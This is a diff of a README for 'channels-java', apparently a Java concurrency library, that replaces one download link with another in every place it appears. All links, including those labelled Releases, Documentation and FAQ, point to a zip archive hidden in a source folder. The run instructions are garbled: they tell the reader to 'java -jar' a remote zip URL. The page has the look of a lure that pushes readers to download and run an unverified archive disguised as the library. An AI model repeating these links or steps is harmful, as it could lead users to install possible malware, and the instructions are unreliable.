@@ -1,7 +1,7 @@
 # 🎉 channels-java - Boost Your Java Performance with Low-Latency Concurrency
 
 ## 💻 Download Now!
-[![Download channels-java](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip)](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip)
+[![Download channels-java](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip)](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to channels-java, a low-latency Java concurrency library designed to help you manage tasks efficiently and effectively. This library uses ring buffers and sequencers to handle multiple threads smoothly. It’s perfect for anyone looking to improve the performance of their Java applications without diving deep into programming.
@@ -16,7 +16,7 @@ Before downloading channels-java, ensure your system meets these requirements:
 ## 📥 Download & Install
 To download channels-java, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip) on GitHub.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip) on GitHub.
 2. Find the latest version of channels-java.
 3. Click on the package suitable for your operating system. The files will usually be available in `.jar` format.
 4. Save the downloaded file to your desired location on your computer.
@@ -29,10 +29,10 @@ After downloading, you can run channels-java with these instructions:
 3. Use the command below to run channels-java:
 
    ```
-   java -jar https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip
+   java -jar https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip
    ```
 
-   Replace `https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip` with the actual name of the file you downloaded. 
+   Replace `https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip` with the actual name of the file you downloaded. 
 
 4. Follow any on-screen instructions to start using the library.
 
@@ -44,14 +44,14 @@ channels-java offers several features that make it a great choice for managing c
 - **Easy Integration**: Smoothly add channels-java to your existing Java projects.
 
 ## 🔗 Useful Links
-- [Releases page](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip): Find all available versions of channels-java.
-- [Documentation](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip): Comprehensive guides on features and usage.
+- [Releases page](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip): Find all available versions of channels-java.
+- [Documentation](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip): Comprehensive guides on features and usage.
   
 ## 📞 Need Help?
 If you encounter any issues or need assistance:
 
 - Visit the issue tracker on GitHub.
-- Check the [FAQ](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip) section for common questions.
+- Check the [FAQ](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip) section for common questions.
 - Join the community discussions if you want to share or seek advice.
 
 ## 👍 Contributions
@@ -68,4 +68,4 @@ Working with channels-java opens up many possibilities for your Java application
 
 Now that you're equipped with the information to download and run channels-java, jump in and experience the benefits for yourself!
 
-[Download channels-java here!](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/jmh/src/main/java/channels-java-1.1.zip)
+[Download channels-java here!](https://raw.githubusercontent.com/ShamshadAhmad86/channels-java/main/core/src/main/java/io/github/ryntric/java-channels-1.7.zip)
